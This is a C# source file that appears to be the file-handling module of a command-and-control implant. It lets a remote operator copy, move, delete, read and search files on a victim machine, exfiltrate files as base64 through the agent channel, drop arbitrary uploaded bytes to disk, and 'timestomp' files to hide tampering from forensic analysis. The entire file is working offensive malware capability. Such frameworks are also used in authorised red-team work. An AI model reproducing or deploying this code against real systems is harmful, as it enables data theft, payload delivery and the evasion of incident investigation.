using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.IO;

namespace Agent.Modules
{
    public class FileModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "File",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Copy",
                        Delegate = CopyFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Move",
                        Delegate = MoveFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Delete",
                        Delegate = DeleteFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Read",
                        Delegate = ReadFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Download",
                        Delegate = DownloadFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Upload",
                        Delegate = UploadFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Search",
                        Delegate = SearchFiles
                    },
                    new ModuleInfo.Command
                    {
                        Name = "TimeStomp",
                        Delegate = TimeStompFile
                    }
                }
            };
        }

        void CopyFile(string AgentID, AgentTask Task)
        {
            try
            {
                var source = (string)Task.Parameters["Source"];
                var destination = (string)Task.Parameters["Destination"];

                File.Copy(source, destination, true);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void MoveFile(string AgentID, AgentTask Task)
        {
            try
            {
                var source = (string)Task.Parameters["Source"];
                var destination = (string)Task.Parameters["Destination"];

                File.Move(source, destination);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void DeleteFile(string AgentID, AgentTask Task)
        {
            try
            {
                var path = (string)Task.Parameters["Path"];

                File.Delete(path);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ReadFile(string AgentID, AgentTask Task)
        {
            try
            {
                var path = (string)Task.Parameters["Path"];
                var text = File.ReadAllText(path);
                Agent.SendMessage(text);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void DownloadFile(string AgentID, AgentTask Task)
        {
            try
            {
                var path = (string)Task.Parameters["Path"];
                var file = Convert.ToBase64String(File.ReadAllBytes(path));
                Agent.SendMessage(file);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void UploadFile(string AgentID, AgentTask Task)
        {
            try
            {
                var source = Convert.FromBase64String((string)Task.Parameters["Source"]);
                var destination = (string)Task.Parameters["Destination"];

                File.WriteAllBytes(destination, source);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void SearchFiles(string AgentID, AgentTask Task)
        {
            try
            {
                var path = (string)Task.Parameters["Path"];
                var pattern = (string)Task.Parameters["Pattern"];
                var files = Directory.GetFiles(path, pattern, SearchOption.AllDirectories);
                var result = string.Join("\n", files);

                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void TimeStompFile(string AgentID, AgentTask Task)
        {
            try
            {
                var source = (string)Task.Parameters["Source"];
                var target = (string)Task.Parameters["Target"];

                var info = new FileInfo(source);

                File.SetCreationTime(target, info.CreationTime);
                File.SetCreationTimeUtc(target, info.CreationTimeUtc);

                File.SetLastWriteTime(target, info.LastWriteTime);
                File.SetLastWriteTimeUtc(target, info.LastWriteTimeUtc);

                File.SetLastAccessTime(target, info.LastAccessTime);
                File.SetLastAccessTimeUtc(target, info.LastAccessTimeUtc);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}